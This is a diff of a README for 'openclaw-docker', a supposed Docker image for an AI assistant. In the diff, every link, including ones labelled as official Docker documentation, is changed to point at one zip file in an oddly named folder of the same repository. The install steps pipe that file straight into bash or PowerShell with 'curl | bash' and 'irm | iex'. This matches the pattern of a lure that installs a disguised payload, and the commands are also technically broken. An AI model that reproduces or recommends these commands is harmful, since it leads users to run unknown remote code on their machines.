@@ -1,6 +1,6 @@
 # 🤖 openclaw-docker - Run Your AI Assistant Effortlessly
 
-[![Download OpenClaw Docker](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip)](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip)
+[![Download OpenClaw Docker](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip)](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -11,8 +11,8 @@ OpenClaw is a pre-built Docker image for running your AI assistant quickly and e
 To use OpenClaw, your machine must meet these basic requirements:
 
 - **Operating System:** Linux, macOS, or Windows
-- **Docker:** Must be installed and running. Get Docker [here](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip).
-- **Docker Compose:** This makes running your containers easier. Install it by following the instructions [here](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip).
+- **Docker:** Must be installed and running. Get Docker [here](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip).
+- **Docker Compose:** This makes running your containers easier. Install it by following the instructions [here](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip).
 
 ## 📥 Download & Install
 
@@ -23,7 +23,7 @@ To use OpenClaw, your machine must meet these basic requirements:
 Open your terminal and run:
 
 ```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip)
+bash <(curl -fsSL https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip)
 ```
 
 #### Windows (PowerShell)
@@ -31,7 +31,7 @@ bash <(curl -fsSL https://raw.githubusercontent.com/AAAbiola/openclaw-docker/mai
 Open PowerShell and execute:
 
 ```powershell
-irm https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip | iex
+irm https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip | iex
 ```
 
 > **Note for Windows users:** Ensure Docker Desktop is installed and running. Alternatively, you can use Windows Subsystem for Linux (WSL2) to run the Linux installation command.
@@ -48,7 +48,7 @@ This installation method will:
 
 If you prefer a manual approach, follow these steps:
 
-1. **Visit the Releases Page**: Go to [OpenClaw Docker Releases](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip).
+1. **Visit the Releases Page**: Go to [OpenClaw Docker Releases](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip).
 2. **Download the Image**: Find the latest version and download the Docker image file that matches your operating system.
 3. **Open Your Terminal**: 
    - For **Linux / macOS**: Use the terminal application.
@@ -56,7 +56,7 @@ If you prefer a manual approach, follow these steps:
 4. **Load the Image**: Use the following command to load the downloaded image:
 
    ```bash
-   docker load < https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip
+   docker load < https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip
    ```
 
 5. **Run the Docker Container**: Execute the command below to start the OpenClaw container:
@@ -119,9 +119,9 @@ If problems persist, consult the community or documentation for help.
 
 ## ℹ️ Additional Resources
 
-- [OpenClaw GitHub Repository](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip)
-- [Docker Compose Documentation](https://raw.githubusercontent.com/AAAbiola/openclaw-docker/main/Diatrymiformes/docker-openclaw-v3.8.zip)
+- [OpenClaw GitHub Repository](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip)
+- [Docker Documentation](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip)
+- [Docker Compose Documentation](https://github.com/AAAbiola/openclaw-docker/raw/refs/heads/main/Diatrymiformes/docker-openclaw-v1.8.zip)
 
 Feel free to explore these resources to enhance your experience with OpenClaw.
 
